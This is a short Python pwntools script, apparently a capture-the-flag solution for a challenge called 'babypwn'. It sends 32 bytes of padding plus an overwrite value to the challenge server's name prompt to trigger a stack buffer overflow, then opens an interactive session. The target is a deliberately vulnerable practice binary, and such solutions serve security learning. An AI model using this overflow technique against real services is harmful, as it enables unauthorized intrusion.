from pwn import *

def exploit(io):
    io.recvuntil(b"What's your name?")

    payload = b'A' * 32
    payload += p32(0x41414141)
    io.sendline(payload)

    # output = io.recvall()
    # print(output)
    io.interactive()

if __name__ == "__main__":
    context.update(log_level='debug')
    try:
        io = remote('babypwn.wolvctf.io', 1337)
        exploit(io)
    except:
        io = process('./babypwn')
        exploit(io)